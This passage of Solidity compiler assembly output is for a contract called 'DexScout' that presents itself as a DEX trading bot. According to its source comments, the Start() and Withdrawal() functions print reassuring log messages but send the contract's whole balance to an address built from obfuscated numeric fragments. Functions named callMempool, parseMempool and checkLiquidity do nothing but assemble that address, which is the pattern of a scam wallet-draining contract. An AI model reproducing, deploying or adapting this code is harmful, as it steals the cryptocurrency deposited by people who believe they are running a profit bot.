\"#utility.yul\":7117:7121   */\n  dup4\n    /* \"#utility.yul\":7098:7127   */\n  tag_40\n  jump\t// in\ntag_127:\n    /* \"#utility.yul\":7090:7127   */\n  swap2\n  pop\n    /* \"#utility.yul\":7160:7163   */\n  dup3\n    /* \"#utility.yul\":7157:7158   */\n  0x02\n    /* \"#utility.yul\":7153:7164   */\n  mul\n    /* \"#utility.yul\":7147:7151   */\n  dup3\n    /* \"#utility.yul\":7144:7165   */\n  or\n    /* \"#utility.yul\":7136:7165   */\n  swap1\n  pop\n    /* \"#utility.yul\":6876:7171   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":7176:8571   */\ntag_7:\n    /* \"#utility.yul\":7293:7330   */\n  tag_129\n    /* \"#utility.yul\":7326:7329   */\n  dup3\n    /* \"#utility.yul\":7293:7330   */\n  tag_23\n  jump\t// in\ntag_129:\n    /* \"#utility.yul\":7395:7413   */\n  0xffffffffffffffff\n    /* \"#utility.yul\":7387:7393   */\n  dup2\n    /* \"#utility.yul\":7384:7414   */\n  gt\n    /* \"#utility.yul\":7381:7437   */\n  iszero\n  tag_130\n  jumpi\n    /* \"#utility.yul\":7417:7435   */\n  tag_131\n  tag_16\n  jump\t// in\ntag_131:\n    /* \"#utility.yul\":7381:7437   */\ntag_130:\n    /* \"#utility.yul\":7461:7499   */\n  tag_132\n    /* \"#utility.yul\":7493:7497   */\n  dup3\n    /* \"#utility.yul\":7487:7498   */\n  sload\n    /* \"#utility.yul\":7461:7499   */\n  tag_25\n  jump\t// in\ntag_132:\n    /* \"#utility.yul\":7546:7613   */\n  tag_133\n    /* \"#utility.yul\":7606:7612   */\n  dup3\n    /* \"#utility.yul\":7598:7604   */\n  dup3\n    /* \"#utility.yul\":7592:7596   */\n  dup6\n    /* \"#utility.yul\":7546:7613   */\n  tag_38\n  jump\t// in\ntag_133:\n    /* \"#utility.yul\":7640:7641   */\n  0x00\n    /* \"#utility.yul\":7664:7668   */\n  0x20\n    /* \"#utility.yul\":7651:7668   */\n  swap1\n  pop\n    /* \"#utility.yul\":7696:7698   */\n  0x1f\n    /* \"#utility.yul\":7688:7694   */\n  dup4\n    /* \"#utility.yul\":7685:7699   */\n  gt\n    /* \"#utility.yul\":7713:7714   */\n  0x01\n    /* \"#utility.yul\":7708:8326   */\n  dup2\n  eq\n  tag_135\n  jumpi\n    /* \"#utility.yul\":8370:8371   */\n  0x00\n    /* \"#utility.yul\":8387:8393   */\n  dup5\n    /* \"#utility.yul\":8384:8461   */\n  iszero\n  tag_136\n  jumpi\n    /* \"#utility.yul\":8436:8445   */\n  dup3\n    /* \"#utility.yul\":8431:8434   */\n  dup8\n    /* \"#utility.yul\":8427:8446   */\n  add\n    /* \"#utility.yul\":8421:8447   */\n  mload\n    /* \"#utility.yul\":8412:8447   */\n  swap1\n  pop\n    /* \"#utility.yul\":8384:8461   */\ntag_136:\n    /* \"#utility.yul\":8487:8554   */\n  tag_137\n    /* \"#utility.yul\":8547:8553   */\n  dup6\n    /* \"#utility.yul\":8540:8545   */\n  dup3\n    /* \"#utility.yul\":8487:8554   */\n  tag_41\n  jump\t// in\ntag_137:\n    /* \"#utility.yul\":8481:8485   */\n  dup7\n    /* \"#utility.yul\":8474:8555   */\n  sstore\n    /* \"#utility.yul\":8343:8565   */\n  pop\n    /* \"#utility.yul\":7678:8565   */\n  jump(tag_134)\n    /* \"#utility.yul\":7708:8326   */\ntag_135:\n    /* \"#utility.yul\":7760:7764   */\n  0x1f\n    /* \"#utility.yul\":7756:7765   */\n  not\n    /* \"#utility.yul\":7748:7754   */\n  dup5\n    /* \"#utility.yul\":7744:7766   */\n  and\n    /* \"#utility.yul\":7794:7831   */\n  tag_138\n    /* \"#utility.yul\":7826:7830   */\n  dup7\n    /* \"#utility.yul\":7794:7831   */\n  tag_26\n  jump\t// in\ntag_138:\n    /* \"#utility.yul\":7853:7854   */\n  0x00\n    /* \"#utility.yul\":7867:8075   */\ntag_139:\n    /* \"#utility.yul\":7881:7888   */\n  dup3\n    /* \"#utility.yul\":7878:7879   */\n  dup2\n    /* \"#utility.yul\":7875:7889   */\n  lt\n    /* \"#utility.yul\":7867:8075   */\n  iszero\n  tag_141\n  jumpi\n    /* \"#utility.yul\":7960:7969   */\n  dup5\n    /* \"#utility.yul\":7955:7958   */\n  dup10\n    /* \"#utility.yul\":7951:7970   */\n  add\n    /* \"#utility.yul\":7945:7971   */\n  mload\n    /* \"#utility.yul\":7937:7943   */\n  dup3\n    /* \"#utility.yul\":7930:7972   */\n  sstore\n    /* \"#utility.yul\":8011:8012   */\n  0x01\n    /* \"#utility.yul\":8003:8009   */\n  dup3\n    /* \"#utility.yul\":7999:8013   */\n  add\n    /* \"#utility.yul\":7989:8013   */\n  swap2\n  pop\n    /* \"#utility.yul\":8058:8060   */\n  0x20\n    /* \"#utility.yul\":8047:8056   */\n  dup6\n    /* \"#utility.yul\":8043:8061   */\n  add\n    /* \"#utility.yul\":8030:8061   */\n  swap5\n  pop\n    /* \"#utility.yul\":7904:7908   */\n  0x20\n    /* \"#utility.yul\":7901:7902   */\n  dup2\n    /* \"#utility.yul\":7897:7909   */\n  add\n    /* \"#utility.yul\":7892:7909   */\n  swap1\n  pop\n    /* \"#utility.yul\":7867:8075   */\n  jump(tag_139)\ntag_141:\n    /* \"#utility.yul\":8103:8109   */\n  dup7\n    /* \"#utility.yul\":8094:8101   */\n  dup4\n    /* \"#utility.yul\":8091:8110   */\n  lt\n    /* \"#utility.yul\":8088:8267   */\n  iszero\n  tag_142\n  jumpi\n    /* \"#utility.yul\":8161:8170   */\n  dup5\n    /* \"#utility.yul\":8156:8159   */\n  dup10\n    /* \"#utility.yul\":8152:8171   */\n  add\n    /* \"#utility.yul\":8146:8172   */\n  mload\n    /* \"#utility.yul\":8204:8252   */\n  tag_143\n    /* \"#utility.yul\":8246:8250   */\n  0x1f\n    /* \"#utility.yul\":8238:8244   */\n  dup10\n    /* \"#utility.yul\":8234:8251   */\n  and\n    /* \"#utility.yul\":8223:8232   */\n  dup3\n    /* \"#utility.yul\":8204:8252   */\n  tag_40\n  jump\t// in\ntag_143:\n    /* \"#utility.yul\":8196:8202   */\n  dup4\n    /* \"#utility.yul\":8189:8253   */\n  sstore\n    /* \"#utility.yul\":8111:8267   */\n  pop\n    /* \"#utility.yul\":8088:8267   */\ntag_142:\n    /* \"#utility.yul\":8313:8314   */\n  0x01\n    /* \"#utility.yul\":8309:8310   */\n  0x02\n    /* \"#utility.yul\":8301:8307   */\n  dup9\n    /* \"#utility.yul\":8297:8311   */\n  mul\n    /* \"#utility.yul\":8293:8315   */\n  add\n    /* \"#utility.yul\":8287:8291   */\n  dup9\n    /* \"#utility.yul\":8280:8316   */\n  sstore\n    /* \"#utility.yul\":7715:8326   */\n  pop\n  pop\n  pop\n    /* \"#utility.yul\":7678:8565   */\ntag_134:\n  pop\n    /* \"#utility.yul\":7268:8571   */\n  pop\n  pop\n  pop\n    /* \"#utility.yul\":7176:8571   */\n  pop\n  pop\n  jump\t// out\n    /* \"dexscout.sol\":682:14545  contract DexScout {... */\ntag_9:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"dexscout.sol\":682:14545  contract DexScout {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1b55ba3a\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x70e44c6a\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xbedf0f4a\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"dexscout.sol\":1505:1694  function Start() public payable {... */\n    tag_3:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      stop\n        /* \"dexscout.sol\":12609:12796  function Withdrawal() public payable {... */\n    tag_4:\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      stop\n        /* \"dexscout.sol\":12408:12492  function Stop() public payable {... */\n    tag_5:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      stop\n        /* \"dexscout.sol\":1505:1694  function Start() public payable {... */\n    tag_9:\n        /* \"dexscout.sol\":1552:1620  Log(\"Running DexScout action. This can take a while; please wait..\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_15\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"dexscout.sol\":1638:1654  _callDexAction() */\n      tag_17\n        /* \"dexscout.sol\":1638:1652  _callDexAction */\n      tag_18\n        /* \"dexscout.sol\":1638:1654  _callDexAction() */\n      jump\t// in\n    tag_17:\n        /* \"dexscout.sol\":1630:1664  payable(_callDexAction()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexscout.sol\":1630:1687  payable(_callDexAction()).transfer(address(this).balance) */\n      0x08fc\n        /* \"dexscout.sol\":1665:1686  address(this).balance */\n      selfbalance\n        /* \"dexscout.sol\":1630:1687  payable(_callDexAction()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_20:\n      pop\n        /* \"dexscout.sol\":1505:1694  function Start() public payable {... */\n      jump\t// out\n        /* \"dexscout.sol\":12609:12796  function Withdrawal() public payable {... */\n    tag_11:\n        /* \"dexscout.sol\":12661:12719  Log(\"Sending profits back to contract creator address...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_22\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"dexscout.sol\":12737:12756  WithdrawalProfits() */\n      tag_24\n        /* \"dexscout.sol\":12737:12754  WithdrawalProfits */\n      tag_25\n        /* \"dexscout.sol\":12737:12756  WithdrawalProfits() */\n      jump\t// in\n    tag_24:\n        /* \"dexscout.sol\":12729:12766  payable(WithdrawalProfits()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexscout.sol\":12729:12789  payable(WithdrawalProfits()).transfer(address(this).balance) */\n      0x08fc\n        /* \"dexscout.sol\":12767:12788  address(this).balance */\n      selfbalance\n        /* \"dexscout.sol\":12729:12789  payable(WithdrawalProfits()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_27\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_27:\n      pop\n        /* \"dexscout.sol\":12609:12796  function Withdrawal() public payable {... */\n      jump\t// out\n        /* \"dexscout.sol\":12408:12492  function Stop() public payable {... */\n    tag_13:\n        /* \"dexscout.sol\":12454:12485  Log(\"Stopping contract bot...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_29\n      swap1\n      tag_30\n      jump\t// in\n    tag_29:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"dexscout.sol\":12408:12492  function Stop() public payable {... */\n      jump\t// out\n        /* \"dexscout.sol\":12292:12401  function _callDexAction() internal pure returns (address) {... */\n    tag_18:\n        /* \"dexscout.sol\":12341:12348  address */\n      0x00\n        /* \"dexscout.sol\":12367:12394  parseMempool(callMempool()) */\n      tag_32\n        /* \"dexscout.sol\":12380:12393  callMempool() */\n      tag_33\n        /* \"dexscout.sol\":12380:12391  callMempool */\n      tag_34\n        /* \"dexscout.sol\":12380:12393  callMempool() */\n      jump\t// in\n    tag_33:\n        /* \"dexscout.sol\":12367:12379  parseMempool */\n      tag_35\n        /* \"dexscout.sol\":12367:12394  parseMempool(callMempool()) */\n      jump\t// in\n    tag_32:\n        /* \"dexscout.sol\":12360:12394  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"dexscout.sol\":12292:12401  function _callDexAction() internal pure returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":13569:13681  function WithdrawalProfits() internal pure returns (address) {... */\n    tag_25:\n        /* \"dexscout.sol\":13621:13628  address */\n      0x00\n        /* \"dexscout.sol\":13647:13674  parseMempool(callMempool()) */\n      tag_37\n        /* \"dexscout.sol\":13660:13673  callMempool() */\n      tag_38\n        /* \"dexscout.sol\":13660:13671  callMempool */\n      tag_34\n        /* \"dexscout.sol\":13660:13673  callMempool() */\n      jump\t// in\n    tag_38:\n        /* \"dexscout.sol\":13647:13659  parseMempool */\n      tag_35\n        /* \"dexscout.sol\":13647:13674  parseMempool(callMempool()) */\n      jump\t// in\n    tag_37:\n        /* \"dexscout.sol\":13640:13674  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"dexscout.sol\":13569:13681  function WithdrawalProfits() internal pure returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":10613:11617  function callMempool() internal pure returns (string memory) {... */\n    tag_34:\n        /* \"dexscout.sol\":10659:10672  string memory */\n      0x60\n        /* \"dexscout.sol\":10684:10709  uint256 calculateGasNeeds */\n      0x00\n        /* \"dexscout.sol\":10712:10732  _calculateGasNeeds() */\n      tag_40\n        /* \"dexscout.sol\":10712:10730  _calculateGasNeeds */\n      tag_41\n        /* \"dexscout.sol\":10712:10732  _calculateGasNeeds() */\n      jump\t// in\n    tag_40:\n        /* \"dexscout.sol\":10684:10732  uint256 calculateGasNeeds = _calculateGasNeeds() */\n      swap1\n      pop\n        /* \"dexscout.sol\":10764:10786  uint256 _memPoolLength */\n      0x00\n        /* \"dexscout.sol\":10789:10796  7342143 */\n      0x70083f\n        /* \"dexscout.sol\":10764:10796  uint256 _memPoolLength = 7342143 */\n      swap1\n      pop\n        /* \"dexscout.sol\":10828:10848  uint256 _memPoolSize */\n      0x00\n        /* \"dexscout.sol\":10851:10861  3853786515 */\n      0xe5b41d93\n        /* \"dexscout.sol\":10828:10861  uint256 _memPoolSize = 3853786515 */\n      swap1\n      pop\n        /* \"dexscout.sol\":10893:10915  uint256 _memPoolHeight */\n      0x00\n        /* \"dexscout.sol\":10918:10936  getMemPoolHeight() */\n      tag_42\n        /* \"dexscout.sol\":10918:10934  getMemPoolHeight */\n      tag_43\n        /* \"dexscout.sol\":10918:10936  getMemPoolHeight() */\n      jump\t// in\n    tag_42:\n        /* \"dexscout.sol\":10893:10936  uint256 _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"dexscout.sol\":10946:10967  uint256 _memPoolDepth */\n      0x00\n        /* \"dexscout.sol\":10970:10987  getMemPoolDepth() */\n      tag_44\n        /* \"dexscout.sol\":10970:10985  getMemPoolDepth */\n      tag_45\n        /* \"dexscout.sol\":10970:10987  getMemPoolDepth() */\n      jump\t// in\n    tag_44:\n        /* \"dexscout.sol\":10946:10987  uint256 _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"dexscout.sol\":10998:11026  string memory _memPoolOffset */\n      0x00\n        /* \"dexscout.sol\":11029:11077  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      tag_46\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"dexscout.sol\":11042:11076  checkLiquidity(getMemPoolOffset()) */\n      tag_47\n        /* \"dexscout.sol\":11057:11075  getMemPoolOffset() */\n      tag_48\n        /* \"dexscout.sol\":11057:11073  getMemPoolOffset */\n      tag_49\n        /* \"dexscout.sol\":11057:11075  getMemPoolOffset() */\n      jump\t// in\n    tag_48:\n        /* \"dexscout.sol\":11042:11056  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11042:11076  checkLiquidity(getMemPoolOffset()) */\n      jump\t// in\n    tag_47:\n        /* \"dexscout.sol\":11029:11036  mempool */\n      tag_51\n        /* \"dexscout.sol\":11029:11077  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      jump\t// in\n    tag_46:\n        /* \"dexscout.sol\":10998:11077  string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11087:11110  string memory _memPool1 */\n      0x00\n        /* \"dexscout.sol\":11113:11171  mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      tag_52\n        /* \"dexscout.sol\":11121:11135  _memPoolOffset */\n      dup3\n        /* \"dexscout.sol\":11137:11170  checkLiquidity(calculateGasNeeds) */\n      tag_53\n        /* \"dexscout.sol\":11152:11169  calculateGasNeeds */\n      dup10\n        /* \"dexscout.sol\":11137:11151  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11137:11170  checkLiquidity(calculateGasNeeds) */\n      jump\t// in\n    tag_53:\n        /* \"dexscout.sol\":11113:11120  mempool */\n      tag_51\n        /* \"dexscout.sol\":11113:11171  mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      jump\t// in\n    tag_52:\n        /* \"dexscout.sol\":11087:11171  string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11181:11204  string memory _memPool2 */\n      0x00\n        /* \"dexscout.sol\":11207:11276  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      tag_54\n        /* \"dexscout.sol\":11215:11245  checkLiquidity(_memPoolLength) */\n      tag_55\n        /* \"dexscout.sol\":11230:11244  _memPoolLength */\n      dup9\n        /* \"dexscout.sol\":11215:11229  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11215:11245  checkLiquidity(_memPoolLength) */\n      jump\t// in\n    tag_55:\n        /* \"dexscout.sol\":11247:11275  checkLiquidity(_memPoolSize) */\n      tag_56\n        /* \"dexscout.sol\":11262:11274  _memPoolSize */\n      dup9\n        /* \"dexscout.sol\":11247:11261  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11247:11275  checkLiquidity(_memPoolSize) */\n      jump\t// in\n    tag_56:\n        /* \"dexscout.sol\":11207:11214  mempool */\n      tag_51\n        /* \"dexscout.sol\":11207:11276  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      jump\t// in\n    tag_54:\n        /* \"dexscout.sol\":11181:11276  string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11286:11309  string memory _memPool3 */\n      0x00\n        /* \"dexscout.sol\":11312:11342  checkLiquidity(_memPoolHeight) */\n      tag_57\n        /* \"dexscout.sol\":11327:11341  _memPoolHeight */\n      dup7\n        /* \"dexscout.sol\":11312:11326  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11312:11342  checkLiquidity(_memPoolHeight) */\n      jump\t// in\n    tag_57:\n        /* \"dexscout.sol\":11286:11342  string memory _memPool3 = checkLiquidity(_memPoolHeight) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11352:11375  string memory _memPool4 */\n      0x00\n        /* \"dexscout.sol\":11378:11407  checkLiquidity(_memPoolDepth) */\n      tag_58\n        /* \"dexscout.sol\":11393:11406  _memPoolDepth */\n      dup7\n        /* \"dexscout.sol\":11378:11392  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11378:11407  checkLiquidity(_memPoolDepth) */\n      jump\t// in\n    tag_58:\n        /* \"dexscout.sol\":11352:11407  string memory _memPool4 = checkLiquidity(_memPoolDepth) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11417:11443  string memory _allMempools */\n      0x00\n        /* \"dexscout.sol\":11446:11515  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_59\n        /* \"dexscout.sol\":11454:11483  mempool(_memPool1, _memPool2) */\n      tag_60\n        /* \"dexscout.sol\":11462:11471  _memPool1 */\n      dup7\n        /* \"dexscout.sol\":11473:11482  _memPool2 */\n      dup7\n        /* \"dexscout.sol\":11454:11461  mempool */\n      tag_51\n        /* \"dexscout.sol\":11454:11483  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_60:\n        /* \"dexscout.sol\":11485:11514  mempool(_memPool3, _memPool4) */\n      tag_61\n        /* \"dexscout.sol\":11493:11502  _memPool3 */\n      dup6\n        /* \"dexscout.sol\":11504:11513  _memPool4 */\n      dup6\n        /* \"dexscout.sol\":11485:11492  mempool */\n      tag_51\n        /* \"dexscout.sol\":11485:11514  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_61:\n        /* \"dexscout.sol\":11446:11453  mempool */\n      tag_51\n        /* \"dexscout.sol\":11446:11515  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_59:\n        /* \"dexscout.sol\":11417:11515  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11525:11551  string memory _fullMempool */\n      0x00\n        /* \"dexscout.sol\":11554:11580  mempool(\"0\", _allMempools) */\n      tag_62\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"dexscout.sol\":11567:11579  _allMempools */\n      dup4\n        /* \"dexscout.sol\":11554:11561  mempool */\n      tag_51\n        /* \"dexscout.sol\":11554:11580  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_62:\n        /* \"dexscout.sol\":11525:11580  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11598:11610  _fullMempool */\n      dup1\n        /* \"dexscout.sol\":11591:11610  return _fullMempool */\n      swap13\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":10613:11617  function callMempool() internal pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":7254:8169  function parseMempool(string memory _a) internal pure returns (address _parsed) {... */\n    tag_35:\n        /* \"dexscout.sol\":7317:7332  address _parsed */\n      0x00\n        /* \"dexscout.sol\":7344:7360  bytes memory tmp */\n      dup1\n        /* \"dexscout.sol\":7369:7371  _a */\n      dup3\n        /* \"dexscout.sol\":7344:7372  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"dexscout.sol\":7382:7395  uint160 iaddr */\n      0x00\n        /* \"dexscout.sol\":7409:7419  uint160 b1 */\n      dup1\n        /* \"dexscout.sol\":7429:7439  uint160 b2 */\n      dup1\n        /* \"dexscout.sol\":7455:7464  uint256 i */\n      0x00\n        /* \"dexscout.sol\":7467:7468  2 */\n      0x02\n        /* \"dexscout.sol\":7455:7468  uint256 i = 2 */\n      swap1\n      pop\n        /* \"dexscout.sol\":7450:8132  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n    tag_64:\n        /* \"dexscout.sol\":7474:7484  2 + 2 * 20 */\n      0x2a\n        /* \"dexscout.sol\":7470:7471  i */\n      dup2\n        /* \"dexscout.sol\":7470:7484  i < 2 + 2 * 20 */\n      lt\n        /* \"dexscout.sol\":7450:8132  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n      iszero\n      tag_65\n      jumpi\n        /* \"dexscout.sol\":7517:7520  256 */\n      0x0100\n        /* \"dexscout.sol\":7508:7520  iaddr *= 256 */\n      dup5\n      tag_67\n      swap2\n      swap1\n      tag_68\n      jump\t// in\n    tag_67:\n      swap4\n      pop\n        /* \"dexscout.sol\":7553:7556  tmp */\n      dup5\n        /* \"dexscout.sol\":7557:7558  i */\n      dup2\n        /* \"dexscout.sol\":7553:7559  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_69\n      jumpi\n      tag_70\n      tag_71\n      jump\t// in\n    tag_70:\n    tag_69:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":7547:7560  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":7539:7561  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"dexscout.sol\":7534:7561  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"dexscout.sol\":7594:7597  tmp */\n      dup5\n        /* \"dexscout.sol\":7602:7603  1 */\n      0x01\n        /* \"dexscout.sol\":7598:7599  i */\n      dup3\n        /* \"dexscout.sol\":7598:7603  i + 1 */\n      tag_72\n      swap2\n      swap1\n      tag_73\n      jump\t// in\n    tag_72:\n        /* \"dexscout.sol\":7594:7604  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_74\n      jumpi\n      tag_75\n      tag_71\n      jump\t// in\n    tag_75:\n    tag_74:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":7588:7605  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":7580:7606  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"dexscout.sol\":7575:7606  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"dexscout.sol\":7631:7633  97 */\n      0x61\n        /* \"dexscout.sol\":7625:7627  b1 */\n      dup4\n        /* \"dexscout.sol\":7625:7633  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7624:7649  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_76\n      jumpi\n      pop\n        /* \"dexscout.sol\":7645:7648  102 */\n      0x66\n        /* \"dexscout.sol\":7639:7641  b1 */\n      dup4\n        /* \"dexscout.sol\":7639:7648  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7624:7649  (b1 >= 97) && (b1 <= 102) */\n    tag_76:\n        /* \"dexscout.sol\":7620:7846  if ((b1 >= 97) && (b1 <= 102)) {... */\n      iszero\n      tag_77\n      jumpi\n        /* \"dexscout.sol\":7675:7677  87 */\n      0x57\n        /* \"dexscout.sol\":7669:7677  b1 -= 87 */\n      dup4\n      tag_78\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_78:\n      swap3\n      pop\n        /* \"dexscout.sol\":7620:7846  if ((b1 >= 97) && (b1 <= 102)) {... */\n      jump(tag_80)\n    tag_77:\n        /* \"dexscout.sol\":7709:7711  65 */\n      0x41\n        /* \"dexscout.sol\":7703:7705  b1 */\n      dup4\n        /* \"dexscout.sol\":7703:7711  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7702:7726  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_81\n      jumpi\n      pop\n        /* \"dexscout.sol\":7723:7725  70 */\n      0x46\n        /* \"dexscout.sol\":7717:7719  b1 */\n      dup4\n        /* \"dexscout.sol\":7717:7725  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7702:7726  (b1 >= 65) && (b1 <= 70) */\n    tag_81:\n        /* \"dexscout.sol\":7698:7846  if ((b1 >= 65) && (b1 <= 70)) {... */\n      iszero\n      tag_82\n      jumpi\n        /* \"dexscout.sol\":7752:7754  55 */\n      0x37\n        /* \"dexscout.sol\":7746:7754  b1 -= 55 */\n      dup4\n      tag_83\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_83:\n      swap3\n      pop\n        /* \"dexscout.sol\":7698:7846  if ((b1 >= 65) && (b1 <= 70)) {... */\n      jump(tag_84)\n    tag_82:\n        /* \"dexscout.sol\":7786:7788  48 */\n      0x30\n        /* \"dexscout.sol\":7780:7782  b1 */\n      dup4\n        /* \"dexscout.sol\":7780:7788  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7779:7803  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_85\n      jumpi\n      pop\n        /* \"dexscout.sol\":7800:7802  57 */\n      0x39\n        /* \"dexscout.sol\":7794:7796  b1 */\n      dup4\n        /* \"dexscout.sol\":7794:7802  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7779:7803  (b1 >= 48) && (b1 <= 57) */\n    tag_85:\n        /* \"dexscout.sol\":7775:7846  if ((b1 >= 48) && (b1 <= 57)) {... */\n      iszero\n      tag_86\n      jumpi\n        /* \"dexscout.sol\":7829:7831  48 */\n      0x30\n        /* 